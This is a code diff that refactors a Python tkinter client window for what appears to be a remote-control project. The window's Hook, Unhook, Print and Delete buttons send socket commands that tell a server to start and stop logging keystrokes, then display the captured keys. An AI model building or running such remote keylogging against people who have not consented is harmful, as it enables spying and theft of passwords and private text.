@@ -1,76 +1,83 @@
-from tkinter import Tk, W, E
-from tkinter import Tk, Text, TOP, BOTH, X, N, LEFT
-from tkinter.ttk import Frame, Label, Button, Entry
-from tkinter import *
+from tkinter import Tk, Text, Button
+import socket
+
+
+class KeystrokeClient:
+    def __init__(self, client):
+        self.client = client
+        self.keylogger = ''
+        self.HookClicked = False
+        self.UnhookClicked = False
+
+        self.Stroke = Tk()
+        self.Stroke.title("Keystroke")
+        self.Stroke.geometry("425x320")
+        self.Stroke.configure(bg='#fff')
+        self.Stroke.iconbitmap('./img/button/remoteIcon.ico')
+        self.Stroke.resizable(False, False)
+
+        self.tab = Text(self.Stroke, width=50, height=15)
+        self.tab.grid(row=3, column=0, columnspan=4)
+
+        hook = Button(self.Stroke, text="Hook", font="Helvetica 10 bold", width=6, bg="#000940", fg="#fff",
+                      activebackground='#fff', padx=17, pady=20, command=self.Hookkey)
+        hook.grid(row=1, column=0, sticky='e')
+
+        unhook = Button(self.Stroke, text="Unhook", font="Helvetica 10 bold", width=6, bg="#000940", fg="#fff",
+                        activebackground='#fff', padx=17, pady=20, command=self.Unhookkey)
+        unhook.grid(row=1, column=1, sticky='e')
+
+        print_button = Button(self.Stroke, text="Print", font="Helvetica 10 bold", width=6, bg="#000940", fg="#fff",
+                              activebackground='#fff', padx=17, pady=20, command=self.Printkey)
+        print_button.grid(row=1, column=2, sticky='e')
+
+        delete = Button(self.Stroke, text="Delete", font="Helvetica 10 bold", width=6, bg="#000940", fg="#fff",
+                        activebackground='#fff', padx=17, pady=25, command=self.Deletekey)
+        delete.grid(row=1, column=3, sticky='e')
+
+    def ReceiveHook(self):
+        data = self.client.recv(1024).decode("utf-8")
+        self.client.sendall(bytes(data, "utf-8"))
+        return data
+
+    def Hookkey(self):
+        if self.HookClicked:
+            return
+        self.HookClicked = True
+        self.UnhookClicked = False
+        self.client.sendall(bytes("HookKey", "utf-8"))
+        checkdata = self.client.recv(1024).decode("utf-8")
+
+    def Unhookkey(self):
+        if self.HookClicked:
+            self.client.sendall(bytes("UnhookKey", "utf-8"))
+            self.keylogger = self.ReceiveHook()
+            self.client.sendall(bytes(self.keylogger, "utf-8"))
+            self.UnhookClicked = True
+            self.HookClicked = False
+
+    def Printkey(self):
+        if not self.UnhookClicked:
+            self.client.sendall(bytes("UnhookKey", "utf-8"))
+            self.keylogger = self.ReceiveHook()
+        self.tab.delete(1.0, 'end')
+        self.tab.insert(1.0, self.keylogger)
+        self.UnhookClicked = True
+        self.HookClicked = False
+
+    def Deletekey(self):
+        self.tab.delete(1.0, 'end')
 
 
 def keystroke(client):
-    # Tạo ra cửa sổ của Keystroke
-    keylogger = ''												# Biến lưu trữ những gõ bàn phím
-    Stroke = Tk()											# Tạo ra cửa sổ
-    Stroke.title("Keystroke")  								# Đặt tiêu đề của cửa sổ
-    Stroke.geometry("425x320")								# Đặt kích thước của cửa sổ
-    Stroke.configure(bg='#fff')							# Đặt màu nền của cửa sổ
-    Stroke.iconbitmap('./img/button/remoteIcon.ico')
-    # Không cho phép thay đổi kích thước cửa sổ
-    Stroke.resizable(False, False)
+    keystroke_client = KeystrokeClient(client)
+    keystroke_client.Stroke.mainloop()
 
-    tab = Text(Stroke, width=50, heigh=15)				# Tạo ra một Textbox
-    tab.grid(row=3, column=0, columnspan=4)			# Đặt Textbox vào cửa sổ
-    HookClicked = False										# Biến kiểm tra xem có đang nhấn phím hay không
-    UnhookClicked = False									# Biến kiểm tra xem có đang nhấn phím hay không
 
-    def ReceiveHook(client):
-        data = client.recv(1024).decode("utf-8")			# Nhận dữ liệu từ server
-        # recv(): 	Phương thức này nhận TCP message.
-        client.sendall(bytes(data, "utf-8"))  				# Gửi dữ liệu đến server
-        return data											# Trả về dữ liệu nhận được
-        # Hàm lắng nghe bàn phím
-
-    def Hookkey():
-        nonlocal HookClicked, UnhookClicked
-        if HookClicked == True:
-            return						# Nếu như nút Hook đã được nhấn thì không thực hiện gì cả
-        HookClicked = True									# Nếu như nút Hook chưa được nhấn thì thực hiện các lệnh sau
-        UnhookClicked = False								# Nút Unhook chưa được nhấn
-        client.sendall(bytes("HookKey", "utf-8"))			# Gửi dữ liệu đến server
-        checkdata = client.recv(1024).decode("utf-8")		# Nhận dữ liệu từ server
-        # Hàm dừng lắng nghe bàn phím
-
-    def Unhookkey():
-        # Khai báo biến keylogger, HookClicked, UnhookClicked
-        nonlocal keylogger, UnhookClicked, HookClicked
-        if HookClicked == True:								# Nếu như nút Hook đã được nhấn thì không thực hiện gì cả
-            # Gửi dữ liệu đến server
-            client.sendall(bytes("UnhookKey", "utf-8"))
-            keylogger = ReceiveHook(client)					# Nhận dữ liệu từ server
-            # Gửi dữ liệu đến server
-            client.sendall(bytes(keylogger, "utf-8"))
-            UnhookClicked = True							# Nút Unhook đã được nhấn
-            HookClicked = False								# Nút Hook chưa được nhấn
-        # In khóa ra màn hình
-
-    def Printkey():
-        # Khai báo biến keylogger, HookClicked, UnhookClicked
-        nonlocal keylogger, UnhookClicked, HookClicked
-        if UnhookClicked == False: 							# Nếu như nút Unhook chưa được nhấn thì thực hiện các lệnh sau
-            # Gửi dữ liệu đến server
-            client.sendall(bytes("UnhookKey", "utf-8"))
-            keylogger = ReceiveHook(client)					# Nhận dữ liệu từ server
-        tab.delete(1.0, END)								# Xóa toàn bộ dữ liệu trong Textbox
-        tab.insert(1.0, keylogger)								# Đưa dữ liệu vào Textbox
-        UnhookClicked = True								# Nút Unhook đã được nhấn
-        HookClicked = False									# Nút Hook chưa được nhấn
-        # Làm sạch màn hình
-
-    def Deletekey():										# Hàm xóa toàn bộ dữ liệu trong Textbox
-        tab.delete(1.0, END)									# Xóa toàn bộ dữ liệu trong Textbox
-
-    hook = Button(Stroke, text="Hook", font="Helvetica 10 bold", width=6, bg="#000940", fg="#fff",
-                  activebackground='#fff', padx=17, pady=20, command=Hookkey).grid(row=1, column=0, sticky=E)
-    unhook = Button(Stroke, text="Unhook", font="Helvetica 10 bold", width=6, bg="#000940", fg="#fff",
-                    activebackground='#fff', padx=17, pady=20, command=Unhookkey).grid(row=1, column=1, sticky=E)
-    print = Button(Stroke, text="Print", font="Helvetica 10 bold", width=6, bg="#000940", fg="#fff",
-                   activebackground='#fff', padx=17, pady=20, command=Printkey).grid(row=1, column=2, sticky=E)
-    delete = Button(Stroke, text="Delete", font="Helvetica 10 bold", width=6, bg="#000940", fg="#fff",
-                    activebackground='#fff', padx=17, pady=25, command=Deletekey).grid(row=1, column=3, sticky=E)
+# if __name__ == "__main__":
+#     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#     HOST = 'your_server_ip_here'
+#     PORT = 1234
+#     client.connect((HOST, PORT))
+#     keystroke(client)
+#     client.close()
